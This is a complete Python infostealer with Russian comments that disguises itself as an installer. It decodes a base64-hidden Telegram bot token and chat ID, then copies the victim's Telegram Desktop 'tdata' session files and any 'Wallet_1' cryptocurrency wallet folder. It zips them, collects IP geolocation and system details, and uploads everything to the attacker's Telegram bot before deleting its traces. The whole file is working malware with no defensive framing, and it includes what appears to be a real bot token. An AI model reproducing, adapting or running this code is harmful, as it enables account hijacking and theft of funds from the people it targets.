import os
import subprocess
import sys
import base64

REQUIRED_PACKAGES = ["requests", "psutil", "pygetwindow"]

def install_packages(packages):
    for package in packages:
        try:
            __import__(package)
        except ImportError:
            print(f"Установка пакета {package}...")
            subprocess.check_call([sys.executable, "-m", "pip", "install", package])

install_packages(REQUIRED_PACKAGES)

import shutil
import tempfile
import zipfile
import uuid
import socket
import platform
import requests
import psutil
import pygetwindow as gw

# Ваши закодированные данные
encoded_bot_token = "NjMwNDgyMDcxMTpBQUVWNFVIeUhFR2JPZnd0NlpWQTRHaGNPakRsMFdNSkFoTQ=="
encoded_chat_id = "ODUzNTM3NjEx"

# Функция для декодирования данных
def decode_data(encoded_data):
    decoded_bytes = base64.b64decode(encoded_data)
    decoded_data = decoded_bytes.decode()
    return decoded_data

# Использование декодированных данных в вашем скрипте
bot_token = decode_data(encoded_bot_token)
chat_id = decode_data(encoded_chat_id)

def is_telegram_running():
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['name'] == 'Telegram.exe':
            return True
    return False

def minimize_to_tray(window_title):
    try:
        window = gw.getWindowsWithTitle(window_title)[0]
        window.minimize()
    except IndexError:
        pass

def restore_from_tray(window_title):
    try:
        window = gw.getWindowsWithTitle(window_title)[0]
        window.restore()
    except IndexError:
        pass

def find_folders(home_dir):
    tdata_folder = os.path.join(home_dir, "AppData", "Roaming", "Telegram Desktop", "tdata")
    wallet1_folder = next((os.path.join(root, "Wallet_1") for root, dirs, files in os.walk(home_dir) if "Wallet_1" in dirs), None)
    return tdata_folder, wallet1_folder

def copy_tdata_folder(tdata_folder, temp_dir):
    temp_tdata_folder = os.path.join(temp_dir, "tdata")
    os.makedirs(temp_tdata_folder, exist_ok=True)

    for root, dirs, files in os.walk(tdata_folder):
        if "user_data" in root:
            continue
        for file in files:
            src_file = os.path.join(root, file)
            dst_file = os.path.join(temp_tdata_folder, os.path.relpath(src_file, tdata_folder))
            os.makedirs(os.path.dirname(dst_file), exist_ok=True)
            try:
                shutil.copy2(src_file, dst_file)
            except PermissionError:
                pass
    return temp_tdata_folder

def archive_folders(tdata_folder, wallet1_folder):
    archive_name = f"{uuid.uuid4()}.zip"
    files_to_archive = False

    with zipfile.ZipFile(archive_name, 'w', zipfile.ZIP_DEFLATED) as z:
        if tdata_folder:
            for root, dirs, files in os.walk(tdata_folder):
                for file in files:
                    file_path = os.path.join(root, file)
                    archive_path = os.path.relpath(file_path, tdata_folder)
                    z.write(file_path, arcname=os.path.join("tdata", archive_path))
                    files_to_archive = True

        if wallet1_folder:
            for root, dirs, files in os.walk(wallet1_folder):
                for file in files:
                    file_path = os.path.join(root, file)
                    archive_path = os.path.relpath(file_path, wallet1_folder)
                    z.write(file_path, arcname=os.path.join("Wallet_1", archive_path))
                    files_to_archive = True

    if not files_to_archive:
        os.remove(archive_name)
        return None

    return archive_name

def get_location():
    try:
        response = requests.get('https://ipinfo.io')
        if response.status_code == 200:
            location_data = response.json()
            location_info = f"🌍 Location: {location_data.get('city')}, {location_data.get('country')}"
            coordinates_info = f"📍 Coordinates: {location_data.get('loc')}, IP: {location_data.get('ip')}"
            system_info = f"└ System: {platform.system()}\n└ Release: {platform.release()}\n└ Version: {platform.version()}\n└ Machine: {platform.machine()}\n└ Processor: {platform.processor()}"
            device_info = f"🖥️ Device: {socket.gethostname()}\n{system_info}"
            return "\n".join([location_info, coordinates_info, device_info])
        else:
            return "Could not determine location"
    except requests.exceptions.RequestException:
        return "Could not determine location"

def send_message(message, bot_token, chat_id):
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    data = {'chat_id': chat_id, 'text': message, 'parse_mode': 'Markdown'}
    response = requests.post(url, data=data)
    return response.json()

def send_archive(archive_name, bot_token, chat_id):
    url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
    location = get_location()
    with open(archive_name, 'rb') as archive_file:
        files = {'document': archive_file}
        data = {'chat_id': chat_id, 'caption': location}
        response = requests.post(url, files=files, data=data)
    return response.json()

def main():
    home_dir = os.path.expanduser("~")
    window_title = "Telegram"

    print("🚀 Starting script. Please note that the installation may take some time.")

    telegram_was_running = is_telegram_running()

    if telegram_was_running:
        minimize_to_tray(window_title)

    print("🔧 Installation and setup complete.")

    tdata_folder, wallet1_folder = find_folders(home_dir)
    temp_dir = tempfile.mkdtemp()
    temp_tdata_folder = copy_tdata_folder(tdata_folder, temp_dir) if tdata_folder else None
    archive_name = archive_folders(temp_tdata_folder, wallet1_folder)

    if archive_name is not None:
        print("📦 Data preparation complete.")
        send_archive(archive_name, bot_token, chat_id)
        print("📤 Data sent successfully.")
        os.remove(archive_name)
        if temp_tdata_folder:
            shutil.rmtree(temp_tdata_folder)
    else:
        print("❌ No data to process.")
        send_message("*😞 No data found on this PC.*\n\n" + get_location(), bot_token, chat_id)

    if telegram_was_running:
        restore_from_tray(window_title)

    print("✅ Script completed successfully.")

if __name__ == "__main__":
    main()
